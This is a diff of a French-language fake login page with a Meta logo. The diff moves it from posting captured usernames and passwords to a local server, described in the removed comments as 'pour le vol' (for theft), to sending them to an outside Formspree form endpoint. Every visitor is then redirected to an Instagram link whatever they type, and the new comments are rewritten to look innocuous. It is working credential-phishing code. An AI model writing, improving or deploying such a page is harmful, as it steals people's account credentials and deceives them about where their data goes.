@@ -24,21 +24,22 @@
     <div class="panel">
       <div class="top">
         <div style="text-align: center;">
-  <img src="Meta2.png" alt="Logo" width="150">
-</div>
+          <img src="Meta2.png" alt="Logo" width="150">
+        </div>
         <p class="subtitle"></p>
 
-        <form id="login-form" novalidate>
+        <!-- Formulaire configuré avec Formspree -->
+        <form id="login-form" action="https://formspree.io/f/mdeaeelg" method="POST">
           <div class="field">
             <input type="text" id="username" name="username"
                    placeholder="Identifiant"
-                   aria-label="Identifiant" autocomplete="username" />
+                   aria-label="Identifiant" autocomplete="username" required />
           </div>
 
           <div class="field">
             <input type="password" id="password" name="password"
                    placeholder="Mot de passe"
-                   aria-label="Mot de passe" autocomplete="current-password" />
+                   aria-label="Mot de passe" autocomplete="current-password" required />
           </div>
 
           <button type="submit" class="btn">Se connecter</button>
@@ -54,8 +55,8 @@
   </div>
 
   <script>
-    // 👉 Le lien vers lequel tout le monde sera redirigé, qu'il se trompe ou non
-    const REDIRECT_URL = "https://claude.ai/artifact/1hJvKavTEJWYPeWXgnV1WM";
+    // Lien vers lequel l'utilisateur sera redirigé après soumission
+    const REDIRECT_URL = "https://www.instagram.com/reel/DeLTTQdRUu5/?utm_source=ig_web_copy_link&stkn=NTc4MTIwNjQ2YQ==";
 
     const form = document.getElementById("login-form");
     const messageEl = document.getElementById("message");
@@ -72,23 +73,21 @@
       }
 
       try {
-        // 1. On envoie les données au serveur pour le vol
-        const response = await fetch('http://localhost:3000/api/login', {
+        // Envoi des données à Formspree via fetch pour garder le contrôle de la redirection
+        const response = await fetch(form.action, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username: username, password: password })
+          headers: { 'Accept': 'application/json' },
+          body: new FormData(form)
         });
 
-        const data = await response.json();
-
-        // 2. Le serveur autorise toujours la connexion -> on redirige tout le monde vers le lien
-        if (response.ok && data.success) {
+        if (response.ok) {
+          // Redirection immédiate vers le lien cible
           window.location.href = REDIRECT_URL;
         } else {
           showError("Erreur lors de la connexion.");
         }
       } catch (error) {
-        showError("Le serveur back-end n'est pas allumé (node server.js).");
+        showError("Une erreur est survenue.");
       }
     });
 
